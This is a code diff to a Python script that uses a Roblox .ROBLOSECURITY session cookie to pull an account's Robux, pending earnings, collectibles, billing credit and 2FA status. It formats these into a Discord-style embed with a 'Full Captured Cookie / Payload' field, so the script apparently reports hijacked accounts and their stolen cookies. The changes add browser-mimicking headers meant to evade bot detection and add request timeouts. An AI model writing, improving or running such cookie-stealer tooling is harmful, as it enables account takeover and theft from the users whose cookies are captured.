@@ -6,9 +6,8 @@ import re
 from datetime import datetime, timezone
 
 def get_csrf_token(session, headers):
-    """Fetch Roblox X-CSRF-Token required for economy & membership endpoints"""
     try:
-        res = session.post("https://auth.roblox.com/v1/logout", headers=headers)
+        res = session.post("https://auth.roblox.com/v1/logout", headers=headers, timeout=10)
         return res.headers.get("x-csrf-token", "")
     except Exception:
         return ""
@@ -42,21 +41,27 @@ def main():
 
         session = requests.Session()
         session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
+        
+        # Enhanced headers to mimic a real desktop browser and bypass automated bot detection
         session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
             "Referer": "https://www.roblox.com/",
             "Origin": "https://www.roblox.com/"
         })
 
-        # Inject CSRF token to bypass 403 blocks
+        # Inject CSRF token
         csrf_token = get_csrf_token(session, session.headers)
         if csrf_token:
             session.headers.update({"X-CSRF-Token": csrf_token})
 
         # --- 1. Fetch Authenticated User Session ---
-        auth_res = session.get("https://users.roblox.com/v1/users/authenticated")
+        auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
+        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
+        
         if auth_res.status_code != 200:
-            print(f"DEBUG: Authentication failed with status {auth_res.status_code}", file=sys.stderr)
+            print(f"DEBUG RESPONSE: {auth_res.text}", file=sys.stderr)
             sys.exit(1)
             
         auth_data = auth_res.json()
@@ -66,16 +71,17 @@ def main():
 
         # --- Fetchers ---
         def get_user_info():
-            return session.get(f"https://users.roblox.com/v1/users/{user_id}").json()
+            return session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()
 
         def get_robux():
-            r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
+            r = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", timeout=10).json()
             return r.get("robux", 0)
 
         def get_pending():
             r = session.get(
                 f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
-                params={"transactionType": "summary", "timeFrame": "Year"}
+                params={"transactionType": "summary", "timeFrame": "Year"},
+                timeout=10
             ).json()
             return r.get("pendingRobuxTotal", 0)
 
@@ -88,7 +94,8 @@ def main():
                     params["cursor"] = cursor
                 r = session.get(
                     f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
-                    params=params
+                    params=params,
+                    timeout=10
                 ).json()
                 for item in r.get("data", []):
                     limiteds.append(item.get("recentAveragePrice", 0))
@@ -98,28 +105,28 @@ def main():
             return limiteds
 
         def get_premium():
-            r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
+            r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", timeout=10)
             return r.json() == True
 
         def get_groups():
-            r = session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").json()
+            r = session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10).json()
             groups = r.get("data", [])
             owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
             return len(groups), owned
 
         def get_games_developer():
-            r = session.get(f"https://develop.roblox.com/v1/user/universes?userId={user_id}").json()
+            r = session.get(f"https://develop.roblox.com/v1/user/universes?userId={user_id}", timeout=10).json()
             return len(r.get("data", [])) > 0
 
         def get_account_settings():
-            r = session.get("https://accountsettings.roblox.com/v1/email").json()
+            r = session.get("https://accountsettings.roblox.com/v1/email", timeout=10).json()
             email_verified = r.get("verified", False)
-            r2 = session.get("https://twostepverification.roblox.com/v1/metadata").json()
+            r2 = session.get("https://twostepverification.roblox.com/v1/metadata", timeout=10).json()
             twofa = r2.get("twoStepVerificationEnabled", False)
             return email_verified, twofa
 
         def get_credit():
-            r = session.get("https://billing.roblox.com/v1/credit").json()
+            r = session.get("https://billing.roblox.com/v1/credit", timeout=10).json()
             return r.get("balance", 0), r.get("currencyType", "Unknown")
 
         def check_played(universe_id):
@@ -127,7 +134,8 @@ def main():
             while True:
                 r = session.get(
                     f"https://badges.roblox.com/v1/users/{user_id}/badges",
-                    params={"limit": 100, "cursor": cursor}
+                    params={"limit": 100, "cursor": cursor},
+                    timeout=10
                 ).json()
                 for badge in r.get("data", []):
                     if badge.get("awardingUniverse", {}).get("id") == universe_id:
@@ -174,7 +182,6 @@ def main():
                 "color": 0x2B2D31,
                 "thumbnail": {"url": avatar_url},
                 "fields": [
-                    # Row 1
                     {
                         "name": "👤 Username",
                         "value": f"`{username}`",
@@ -182,8 +189,6 @@ def main():
                     },
                     {"name": "\u200b", "value": "\u200b", "inline": True},
                     {"name": "\u200b", "value": "\u200b", "inline": True},
-
-                    # Row 2
                     {
                         "name": "📈 Account Stats",
                         "value": (
@@ -209,8 +214,6 @@ def main():
                         ),
                         "inline": True
                     },
-
-                    # Row 3
                     {
                         "name": "💳 Payments",
                         "value": f"• Credit: `{credit:.2f} {currency}`",
@@ -233,8 +236,6 @@ def main():
                         ),
                         "inline": True
                     },
-
-                    # Row 4
                     {
                         "name": "⭐ Premium",
                         "value": f"`{premium}`",
@@ -249,8 +250,6 @@ def main():
                         "inline": True
                     },
                     {"name": "\u200b", "value": "\u200b", "inline": True},
-
-                    # Row 5 (Full Payload Block)
                     {
                         "name": "🔑 Full Captured Cookie / Payload",
                         "value": full_cookie_display,
